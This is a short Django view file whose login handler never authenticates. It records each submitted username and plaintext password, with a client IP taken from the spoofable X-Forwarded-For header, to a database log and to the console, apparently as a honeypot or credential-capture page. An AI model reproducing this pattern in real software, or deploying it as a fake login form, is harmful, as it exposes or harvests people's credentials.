from django.shortcuts import HttpResponse, render
from django.http import JsonResponse
from .models import AuditLog
import datetime


def login_attempt(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        user_ip = request.META.get('HTTP_X_FORWARDED_FOR')
        if user_ip is not None:
            ip = user_ip.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        AuditLog.objects.create(
               ip_address=ip,
               Username=username,
               Password=password,
            )

        # Log the login attempt to the console
        # print(f"Login Attempt - IP: {ip}, Username: {username}, Password: {password}")
        print(f"{timestamp} - Login Attempt - IP: {ip}, Username: {username}, Password: {password}")

    
    return render(request, 'index.html')

# views.py


